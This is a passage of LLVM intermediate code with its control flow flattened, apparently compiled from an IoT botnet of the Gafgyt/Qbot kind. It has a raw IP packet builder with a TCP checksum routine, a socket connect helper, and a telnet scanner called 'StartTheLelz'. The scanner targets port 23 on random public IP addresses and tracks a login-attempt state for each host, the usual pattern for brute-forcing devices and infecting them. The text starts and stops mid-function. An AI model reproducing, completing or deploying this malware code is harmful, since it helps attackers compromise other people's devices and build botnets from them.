  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1926402697, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1926402697, label %first
    i32 -439751200, label %7
    i32 1230189097, label %8
    i32 -248690590, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -439751200, i32 1230189097
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -248690590, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -248690590, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 1016539772, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1016539772, label %first
    i32 -1840598363, label %14
    i32 1058940403, label %15
    i32 -432841707, label %38
    i32 1570614760, label %39
    i32 1791109317, label %45
    i32 -1370065899, label %46
    i32 1583483787, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 -1840598363, i32 1058940403
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1583483787, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #2
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #2
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -432841707, i32 1570614760
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1583483787, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 1791109317, i32 -1370065899
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1583483787, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 1583483787, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 23) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %31 = getelementptr inbounds [8 x i8], [8 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 8, i32 4, i1 false)
  %32 = call noalias i8* @malloc(i64 1025) #2
  store i8* %32, i8** %17, align 8
  %33 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 1025, i32 1, i1 false)
  %34 = load i32, i32* %11, align 4
  %35 = zext i32 %34 to i64
  %36 = call i8* @llvm.stacksave()
  store i8* %36, i8** %19, align 8
  %37 = alloca %struct.telstate_t, i64 %35, align 16
  %38 = bitcast %struct.telstate_t* %37 to i8*
  %39 = load i32, i32* %11, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 5
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 %41, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -2145297875, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 -2145297875, label %42
    i32 449094574, label %47
    i32 1385965708, label %61
    i32 -1377511268, label %64
    i32 -195373690, label %65
    i32 1684170227, label %73
    i32 1335864675, label %74
    i32 292479787, label %75
    i32 -746437505, label %76
    i32 694418056, label %77
    i32 -1298726671, label %82
    i32 1117178434, label %90
    i32 418506172, label %96
    i32 -2086645905, label %NodeBlock13
    i32 -1265384508, label %NodeBlock11
    i32 707109135, label %NodeBlock9
    i32 2080179872, label %LeafBlock7
    i32 -1770321775, label %NodeBlock5
    i32 -1598602255, label %NodeBlock3
    i32 1785031175, label %NodeBlock1
    i32 -1305649732, label %NodeBlock
    i32 -1356581258, label %LeafBlock
    i32 -1090048116, label %112
    i32 -1072640191, label %121
    i32 1478111353, label %141
    i32 450452447, label %150
    i32 989131849, label %171
    i32 786520729, label %176
    i32 -575941593, label %185
    i32 -534972956, label %190
    i32 -1772844532, label %191
    i32 925159522, label %192
    i32 1794958493, label %217
    i32 1342659954, label %218
    i32 -970136630, label %241
    i32 537746205, label %246
    i32 1911941460, label %250
    i32 799439028, label %254
    i32 1586384678, label %255
    i32 -755121397, label %256
    i32 607950670, label %265
    i32 -68482607, label %266
    i32 355637277, label %300
    i32 -529905128, label %311
    i32 -1330042048, label %315
    i32 -1792543510, label %332
    i32 456927858, label %333
    i32 998506845, label %337
    i32 786222391, label %341
    i32 -175414762, label %342
    i32 -1230168167, label %352
    i32 -1738427408, label %356
    i32 307347565, label %357
    i32 111908397, label %372
    i32 165265050, label %381
    i32 2043428376, label %385
    i32 649453780, label %389
    i32 -811507563, label %390
    i32 306613098, label %400
    i32 -1267617176, label %404
    i32 754202210, label %405
    i32 -1776185520, label %431
    i32 1595482448, label %435
    i32 -93164642, label %444
    i32 816603997, label %448
    i32 -298726668, label %452
    i32 1652123587, label %467
    i32 512165358, label %476
    i32 1227768129, label %480
    i32 1339072099, label %484
    i32 1456151776, label %485
    i32 1900288130, label %495
    i32 767472452, label %499
    i32 1758911882, label %500
    i32 663310553, label %526
    i32 155063704, label %530
    i32 1084221214, label %539
    i32 1284414939, label %543
    i32 685492456, label %547
    i32 -1790598291, label %562
    i32 1139478033, label %576
    i32 -199974523, label %580
    i32 -421558847, label %589
    i32 1998750680, label %598
    i32 -258228280, label %602
    i32 -776980334, label %628
    i32 -1510373238, label %629
    i32 861906696, label %633
    i32 1801626177, label %634
    i32 1163361059, label %635
    i32 1246628212, label %645
    i32 1103706153, label %649
    i32 -567805291, label %650
    i32 1095287080, label %664
    i32 855503153, label %665
    i32 -1253952496, label %674
    i32 630078347, label %675
    i32 -1946142150, label %687
    i32 221557552, label %691
    i32 892252023, label %701
    i32 -1810293277, label %710
    i32 -937268529, label %711
    i32 -1290934989, label %715
    i32 658584244, label %NewDefault
    i32 171604049, label %716
    i32 -332457352, label %717
    i32 -853426486, label %720
    i32 -861828629, label %721
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %43, %44
  %46 = select i1 %45, i32 449094574, i32 -1377511268
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %49
  %51 = bitcast %struct.telstate_t* %50 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 3
  store i8 1, i8* %55, align 1
  %56 = load i8*, i8** %17, align 8
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 9
  store i8* %56, i8** %60, align 8
  store i32 1385965708, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %5, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %5, align 4
  store i32 -2145297875, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -195373690, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %68
  %70 = load i8*, i8** %69, align 8
  %71 = icmp ne i8* %70, null
  %72 = select i1 %71, i32 1684170227, i32 1335864675
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 -195373690, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 292479787, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 -746437505, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 694418056, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %5, align 4
  %79 = load i32, i32* %11, align 4
  %80 = icmp slt i32 %78, %79
  %81 = select i1 %80, i32 -1298726671, i32 -853426486
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 7
  %87 = load i32, i32* %86, align 16
  %88 = icmp eq i32 %87, 0
  %89 = select i1 %88, i32 1117178434, i32 418506172
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 7
  store i32 %91, i32* %95, align 16
  store i32 418506172, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %5, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 2
  %101 = load i8, i8* %100, align 8
  %102 = zext i8 %101 to i32
  store i32 %102, i32* %.reg2mem
  store i32 -2086645905, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem
  %Pivot14 = icmp slt i32 %.reload23, 4
  %103 = select i1 %Pivot14, i32 -1598602255, i32 -1265384508
  store i32 %103, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload18 = load volatile i32, i32* %.reg2mem
  %Pivot12 = icmp slt i32 %.reload18, 6
  %104 = select i1 %Pivot12, i32 -1770321775, i32 707109135
  store i32 %104, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload16, 7
  %105 = select i1 %Pivot10, i32 685492456, i32 2080179872
  store i32 %105, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf8 = icmp eq i32 %.reload, 7
  %106 = select i1 %SwitchLeaf8, i32 -567805291, i32 658584244
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload17, 5
  %107 = select i1 %Pivot6, i32 -298726668, i32 1758911882
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem
  %Pivot4 = icmp slt i32 %.reload22, 2
  %108 = select i1 %Pivot4, i32 -1305649732, i32 1785031175
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem
  %Pivot2 = icmp slt i32 %.reload19, 3
  %109 = select i1 %Pivot2, i32 307347565, i32 754202210
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload21, 1
  %110 = select i1 %Pivot, i32 -1356581258, i32 1586384678
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload20, 0
  %111 = select i1 %SwitchLeaf, i32 -1090048116, i32 658584244
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %114
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %115, i32 0, i32 3
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 1
  %120 = select i1 %119, i32 -1072640191, i32 1478111353
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 9
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %20, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %128
  %130 = bitcast %struct.telstate_t* %129 to i8*
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 32, i32 16, i1 false)
  %131 = load i8*, i8** %20, align 8
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 9
  store i8* %131, i8** %135, align 8
  %136 = call i32 @GetRandomPublicIP()
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %138
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %139, i32 0, i32 1
  store i32 %136, i32* %140, align 4
  store i32 925159522, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i32, i32* %5, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 0
  %149 = select i1 %148, i32 450452447, i32 -1772844532
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 5
  %155 = load i8, i8* %154, align 1
  %156 = add i8 %155, 1
  store i8 %156, i8* %154, align 1
  %157 = load i32, i32* %5, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 4
  %161 = load i8, i8* %160, align 2
  %162 = add i8 %161, 1
  store i8 %162, i8* %160, align 2
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 5
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i64
  %169 = icmp eq i64 %168, 9
  %170 = select i1 %169, i32 989131849, i32 786520729
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 3
  store i8 1, i8* %175, align 1
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %5, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 4
  %181 = load i8, i8* %180, align 2
  %182 = zext i8 %181 to i64
  %183 = icmp eq i64 %182, 9
  %184 = select i1 %183, i32 -575941593, i32 -534972956
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %5, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 3
  store i8 1, i8* %189, align 1
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 -1772844532, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  store i32 925159522, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %193, align 4
  %194 = call zeroext i16 @htons(i16 zeroext 23) #13
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %197 = getelementptr inbounds [8 x i8], [8 x i8]* %196, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %197, i8 0, i64 8, i32 4, i1 false)
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %204 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %203, i32 0, i32 0
  store i32 %202, i32* %204, align 4
  %205 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 0
  store i32 %205, i32* %209, align 16
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 16
  %215 = icmp eq i32 %214, -1
  %216 = select i1 %215, i32 1794958493, i32 1342659954
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 16
  %224 = load i32, i32* %5, align 4
